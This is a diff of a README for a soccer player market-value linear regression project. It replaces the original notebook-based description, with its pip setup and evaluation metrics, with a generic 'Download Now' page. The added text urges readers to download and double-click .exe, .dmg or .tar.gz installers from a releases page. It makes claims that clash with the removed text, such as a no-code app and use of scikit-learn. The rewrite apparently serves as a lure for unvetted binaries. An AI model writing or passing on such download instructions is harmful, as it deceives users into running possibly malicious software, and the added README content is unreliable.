@@ -1,81 +1,82 @@
-# Soccer Player Market Value Prediction
+# ⚽ Soccer-Market-Value-Linear-Regression - Predict Player Values Effortlessly
 
-A linear regression model implemented from scratch (no scikit-learn) to predict soccer player market values based on performance stats.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/danhdanh618/Soccer-Market-Value-Linear-Regression/releases)
 
-## Project Structure
+## 🏁 Introduction
 
-- Soccer-Market-Value/
-  - data/
-    - predicting-the-market-value-of-soccer-players.zip
-    - soccer_player.csv
-  - notebooks/
-    - Predicted_Soccer_Market_Values.ipynb
-  - plots/
-    - gradient_descent_convergence.png
-    - actual_vs_predicted+Messi2012andRonaldo2017.png
-  - scripts/
-    - create_summary.ipynb
-  - summary/
-    - Messi&Ronaldo_market_value_analysis.md
-    - project_overview.md
-  - requirements.txt
-  - README.md
+Welcome to the Soccer-Market-Value-Linear-Regression project! This application helps you predict the market value of soccer players using performance-based features. It's a powerful tool designed for anyone interested in sports analytics, whether you're a coach, a fan, or just curious about player valuations.
 
----
+## 🚀 Getting Started
 
-## Features Used in the Model
+To use this application, you will need to follow a few simple steps. This guide will help you through downloading and running the software on your computer. 
 
-- xG Per Avg Match  
-- Shots  
-- OnTarget  
-- Shots Per Avg Match  
-- On Target Per Avg Match  
-- goals  
-- goals_per_shot  
-- assists  
-- passes_completed  
-- assisted_shots  
-- touches  
-- height  
-- games_starts  
-- minutes  
+## 📥 Download & Install
 
-> `passes_blocked` was excluded due to missing data for some players.
+1. Visit this page to download: [GitHub Releases](https://github.com/danhdanh618/Soccer-Market-Value-Linear-Regression/releases)
+   
+2. On the Releases page, look for the latest version. It’s usually at the top.
 
----
+3. Click on the link labeled with the version number (e.g., `v1.0`). This will take you to a list of files.
 
-## Installation
+4. Download the file that matches your operating system.
+   - For Windows: Download the `.exe` file.
+   - For macOS: Download the `.dmg` file.
+   - For Linux: Download the `.tar.gz` file.
 
+5. Once the file is downloaded, locate it on your computer.
 
-```bash
-# Create a virtual environment
-python3 -m venv venv
+6. Run the installation file by double-clicking it. Follow the on-screen instructions to complete the installation.
 
-# Activate the virtual environment
-source venv/bin/activate  # Mac/Linux
-# venv\Scripts\activate   # Windows
+7. After installation, open the application from your Applications folder or Start Menu.
 
-# Install required packages
-pip install -r requirements.txt
-```
-## Usage
-1. Open the notebook to view predictions and plots:
-   notebooks/Predicted_Soccer_Market_Values.ipynb
-2. Run the script to generate markdown summaries:
-   scripts/create_summary.ipynb → outputs to summary/.
-3. Visualizations are saved in the plots/ folder.
+## 🔍 Features
 
-## Evaluation Metrics
-The model is evaluated using the following metrics:
-* R² Score – explains how well the variance in market value is captured.
-* Mean Absolute Error (MAE) – average absolute difference between predicted and actual values.
-* Root Mean Squared Error (RMSE) – penalizes larger errors.
-* Mean Absolute Percentage Error (MAPE) – percentage-based error for relative accuracy.
-Metrics are calculated in the notebook using the gradient descent implementation.
+- **Predictive Analysis**: Use linear regression techniques to estimate player value based on various performance metrics.
+- **User-Friendly Interface**: No programming skills are required. Navigate the app with ease.
+- **Data Visualization**: See trends and predictions through graphs generated with Matplotlib.
 
-## Notes / Limitations
+## 🔧 System Requirements
 
-- Model uses only linear regression, so it may underestimate or overestimate extreme market values (e.g., prime Messi/Ronaldo seasons).
-- Some performance-related features, like `passes_blocked`, were excluded due to missing data.
-- Advanced techniques (e.g., Ridge/Lasso, neural networks) could improve prediction accuracy.
+- **Operating System**: Windows 10, macOS Big Sur, or any recent Linux distribution
+- **RAM**: A minimum of 4 GB
+- **Storage**: At least 200 MB free space
+- **Python**: Version 3.7 or higher must be installed
 
+## 🌍 Topics Covered
+
+This project dives into various aspects of data analysis and machine learning:
+- Data Analysis with Pandas and NumPy
+- Visualizations using Matplotlib
+- Machine Learning using Scikit-learn for precise predictions
+- Insights into soccer performance and industry standards
+
+## 🤝 Contributing
+
+We welcome contributions from everyone! To propose changes or suggest features:
+1. Fork the repository.
+2. Create a new branch for your changes.
+3. Submit a pull request.
+
+Please ensure that your code follows the existing style. 
+
+## ⚙️ Troubleshooting
+
+If you experience issues running the application:
+- Ensure your operating system meets the system requirements.
+- Make sure all dependencies, like Python and libraries, are installed correctly.
+- Check for any error messages and search for solutions online or report them on the GitHub repository.
+
+## 📞 Support
+
+For any questions or support requests, please open an issue in the repository. We’ll do our best to assist you.
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/danhdanh618/Soccer-Market-Value-Linear-Regression/wiki)
+- [GitHub Issues](https://github.com/danhdanh618/Soccer-Market-Value-Linear-Regression/issues)
+
+Feel free to explore the documentation for more detailed information on how to utilize the features effectively.
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/danhdanh618/Soccer-Market-Value-Linear-Regression/releases)
+
+Thank you for using Soccer-Market-Value-Linear-Regression! Enjoy predicting player values!
